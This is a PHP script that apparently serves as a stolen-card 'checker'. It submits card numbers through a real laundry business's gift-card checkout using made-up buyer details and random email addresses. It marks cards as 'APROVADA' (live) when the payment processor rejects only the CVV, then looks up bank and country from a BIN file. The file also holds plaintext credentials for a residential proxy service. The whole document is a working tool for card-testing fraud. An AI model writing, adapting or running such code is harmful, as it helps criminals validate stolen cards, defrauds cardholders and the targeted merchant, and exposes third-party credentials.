<?php
set_time_limit(0);
error_reporting(0);
    

   function value($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
    }
function getstr($string, $start, $end, $offset = 1) {
    $str = explode($start, $string);
    $str = explode($end, $str[$offset]);
    return $str[0];
}
    if($_GET['testar']=="cc"){
        $ccs    = $_GET['ccs'];
        $separador  = $_GET['separador'];
        $id     = $_GET['id'];
        $explode = explode($separador,$ccs);
        if($explode[0][0]=='4'){
            $bander = '2';
        }elseif($explode[0][0]=='5'){
            $bander = '1';
        }
        elseif($explode[0][0]=='37'){
            $bander = '3';
        }   
       

        $numero = $explode[0];
        $mes = $explode[1];
        $ano = $explode[2];
        $cvv = $explode[3];



   $ch = curl_init();

$username = 'lum-customer-hl_fbd1077f-zone-static';
$password = 'fu33tidjltd5';
$port = 22225;
$user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko';
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';
$random = mt_rand();

     curl_setopt($ch, CURLOPT_URL,"http://www.washclubnyc.com/ajax.php");
    $headr = array();
    $headr[] = 'Host: www.washclubnyc.com';
    $headr[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko';
    $headr[] = 'Origin: http://www.washclubnyc.com';
    $headr[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
    $headr[] = 'Referer: http://www.washclubnyc.com/laundry-gift-card.php';
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
    curl_setopt($ch, CURLOPT_HEADER,0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
   // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
   //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-country-br-dns-local-session-$session:$password");
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch, CURLOPT_VERBOSE,1);
    curl_setopt($ch, CURLOPT_COOKIESESSION,false);
    curl_setopt($ch, CURLOPT_COOKIEJAR,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_POST,true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,'action=ajax_gift_card_precheckout&amount=25&email=ga'.$random.'nga'.$random.'m'.$random.'%40gmail.com&type_id=1');
    $curl = curl_exec($ch); // Resultado



     curl_setopt($ch, CURLOPT_URL,"https://www.washclubnyc.com/gift_cards_checkout.php");
    $headr = array();
    $headr[] = 'Host: www.washclubnyc.com';
    $headr[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko';
    $headr[] = 'Origin: http://www.washclubnyc.com';
    $headr[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
    $headr[] = 'Referer: http://www.washclubnyc.com/laundry-gift-card.php';
   //	 curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
    curl_setopt($ch, CURLOPT_HEADER,0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
   // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
   //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-country-br-dns-local-session-$session:$password");
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch, CURLOPT_VERBOSE,1);
    curl_setopt($ch, CURLOPT_COOKIESESSION,false);
    curl_setopt($ch, CURLOPT_COOKIEJAR,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE,getcwd().'/cookiess.txt');
    $curl = curl_exec($ch); // Resultado




    curl_setopt($ch, CURLOPT_URL,"https://www.washclubnyc.com/gift_cards_checkout.php");
    $headr = array();
    $headr[] = 'Host: www.washclubnyc.com';
    $headr[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko';
    $headr[] = 'Origin: http://www.washclubnyc.com';
    $headr[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
    $headr[] = 'Referer: http://www.washclubnyc.com/laundry-gift-card.php';
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
    curl_setopt($ch, CURLOPT_HEADER,0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
   // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
   //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-country-br-dns-local-session-$session:$password");
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch, CURLOPT_VERBOSE,1);
    curl_setopt($ch, CURLOPT_COOKIESESSION,false);
    curl_setopt($ch, CURLOPT_COOKIEJAR,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_POST,true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,'action=checkout_process&first_name=fabafga&last_name=caster&email=gan'.$random.'ga'.$random.'m'.$random.'%40gmail.com&phone=3109435299&address=2323+2&address2=&city=los+angeles&state=ca&zip=90064&cc_num='.$numero.'&cc_exp_m='.$mes.'&cc_exp_y='.$ano.'&cc_cvv=001');
    $curl = curl_exec($ch); // Resultado
 
echo $curl;


        if(strpos($curl, "Rejected: cvv")!==false){ 


        $bin = substr($numero, 0, 6);
$file = 'bins.csv';
$searchfor = $bin;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
    $encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $teste = $pieces[3];
        $teste1 = $pieces[7];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
} else {
    $pais = $pieces[5];
    $paiscode = $pieces[6];
    $teste = $pieces[3];
    $teste1 = $pieces[7];
    $level = $pieces[4];
    $banco = $pieces[2];
    $bandeira = $pieces[1];
}



            echo"<center><span style='text-shadow: 0 0 7px green; color: green;'> APROVADA </span>$numero|$mes|$ano|$cvv Info: '.$bandeira.' '.$banco.' '.$teste.' '.$level.'('.$pais.') </center>";
        }else{ 
        echo"<center><span style='text-shadow: 0 0 7px red; color: red;'> REPROVADA </span>  $numero|$mes|$ano|$cvv  Res: $geterr </font></center>";
             
        }
    }
?>
